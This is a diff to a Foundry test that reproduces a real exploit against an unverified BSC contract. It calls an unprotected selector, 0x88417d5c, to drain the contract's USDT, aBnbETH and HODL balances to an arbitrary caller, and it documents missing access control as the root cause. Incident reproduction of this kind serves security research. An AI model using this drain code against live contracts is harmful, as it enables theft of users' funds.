@@ -16,10 +16,10 @@ import "../interface.sol";
 // @Analysis
 // Twitter Guy : https://t.me/defimon_alerts/1184
 //
-// Attack summary: The attacker called an unauthenticated function on the unverified victim contract
-// to transfer the victim's token balances to an attack helper, then forwarded the received assets.
-// Root cause: selector 0x88417d5c accepts token/amount payloads and transfers victim-held tokens
-// to msg.sender without effective caller authorization.
+// Attack summary: Any caller can invoke selector 0x88417d5c with token/amount entries, causing the
+// victim to transfer its ERC20 balances to msg.sender.
+// Root cause: missing access control on the token-drain path; owner/storage-owner checks are not
+// applied to selector 0x88417d5c.
 
 address constant VULNERABLE = 0x000004A70f92f1B22de1201aF76C48365D5D0000;
 address constant DRAIN_USDT = 0x55d398326f99059fF775485246999027B3197955;
@@ -32,20 +32,25 @@ struct TokenAmount {
     uint256 amount;
 }
 
+interface IOwnableLike {
+    function owner() external view returns (address);
+}
+
 contract ContractTest is BaseTestWithBalanceLog {
-    address private profitReceiver;
+    address private arbitraryCaller;
 
     function setUp() public {
         uint256 forkBlock = 50_311_055;
         vm.createSelectFork("bsc", forkBlock);
 
-        profitReceiver = makeAddr("profitReceiver");
-        attacker = profitReceiver;
+        arbitraryCaller = makeAddr("arbitraryCaller");
+        attacker = arbitraryCaller;
         multiAssetLog = true;
         _addFundingToken(DRAIN_USDT);
         _addFundingToken(DRAIN_ABNB_ETH);
 
         vm.label(VULNERABLE, "Unverified Victim");
+        vm.label(arbitraryCaller, "Arbitrary Caller");
         vm.label(DRAIN_USDT, "USDT");
         vm.label(DRAIN_ABNB_ETH, "aBnbETH");
         vm.label(DRAIN_HODL, "HODL");
@@ -56,51 +61,38 @@ contract ContractTest is BaseTestWithBalanceLog {
         uint256 victimABnbEthBefore = IERC20(DRAIN_ABNB_ETH).balanceOf(VULNERABLE);
         uint256 victimHodlBefore = IERC20(DRAIN_HODL).balanceOf(VULNERABLE);
 
-        uint256 attackerUsdtBefore = IERC20(DRAIN_USDT).balanceOf(profitReceiver);
-        uint256 attackerABnbEthBefore = IERC20(DRAIN_ABNB_ETH).balanceOf(profitReceiver);
-        uint256 attackerHodlBefore = IERC20(DRAIN_HODL).balanceOf(profitReceiver);
+        uint256 attackerUsdtBefore = IERC20(DRAIN_USDT).balanceOf(arbitraryCaller);
+        uint256 attackerABnbEthBefore = IERC20(DRAIN_ABNB_ETH).balanceOf(arbitraryCaller);
+        uint256 attackerHodlBefore = IERC20(DRAIN_HODL).balanceOf(arbitraryCaller);
 
-        // step 1: deploy a local helper and drain the victim-held token balances.
-        Unverified0000DrainAttack attack = new Unverified0000DrainAttack(profitReceiver);
-        attack.execute();
+        // step 1: prove the drain caller is not the public Ownable owner.
+        assertNotEq(arbitraryCaller, IOwnableLike(VULNERABLE).owner());
 
-        // step 2: assert the victim balances were drained and attacker balances increased.
+        // step 2: drain the victim-held token balances as an arbitrary non-owner caller.
+        _drainAsArbitraryCaller(DRAIN_USDT);
+        _drainAsArbitraryCaller(DRAIN_ABNB_ETH);
+        _drainAsArbitraryCaller(DRAIN_HODL);
+
+        // step 3: assert the victim balances were drained and attacker balances increased.
         assertEq(IERC20(DRAIN_USDT).balanceOf(VULNERABLE), 0);
         assertEq(IERC20(DRAIN_ABNB_ETH).balanceOf(VULNERABLE), 0);
         assertEq(IERC20(DRAIN_HODL).balanceOf(VULNERABLE), 0);
 
-        assertEq(IERC20(DRAIN_USDT).balanceOf(profitReceiver) - attackerUsdtBefore, victimUsdtBefore);
-        assertEq(IERC20(DRAIN_ABNB_ETH).balanceOf(profitReceiver) - attackerABnbEthBefore, victimABnbEthBefore);
-        assertGt(IERC20(DRAIN_HODL).balanceOf(profitReceiver) - attackerHodlBefore, (victimHodlBefore * 9) / 10);
-    }
-}
-
-contract Unverified0000DrainAttack {
-    address private immutable profitReceiver;
-
-    constructor(
-        address _profitReceiver
-    ) {
-        profitReceiver = _profitReceiver;
+        assertEq(IERC20(DRAIN_USDT).balanceOf(arbitraryCaller) - attackerUsdtBefore, victimUsdtBefore);
+        assertEq(IERC20(DRAIN_ABNB_ETH).balanceOf(arbitraryCaller) - attackerABnbEthBefore, victimABnbEthBefore);
+        assertGt(IERC20(DRAIN_HODL).balanceOf(arbitraryCaller) - attackerHodlBefore, (victimHodlBefore * 9) / 10);
     }
 
-    function execute() external {
-        _drainAndForward(DRAIN_USDT);
-        _drainAndForward(DRAIN_ABNB_ETH);
-        _drainAndForward(DRAIN_HODL);
-    }
-
-    function _drainAndForward(
+    function _drainAsArbitraryCaller(
         address token
     ) private {
         uint256 amount = IERC20(token).balanceOf(VULNERABLE);
         TokenAmount[] memory entries = new TokenAmount[](1);
         entries[0] = TokenAmount({token: token, amount: amount});
 
+        vm.prank(arbitraryCaller);
         (bool ok,) =
             VULNERABLE.call(abi.encodeWithSelector(VICTIM_DRAIN_SELECTOR, uint256(0), uint256(0), uint256(0), entries));
         require(ok, "victim drain call failed");
-
-        require(IERC20(token).transfer(profitReceiver, IERC20(token).balanceOf(address(this))), "forward failed");
     }
 }
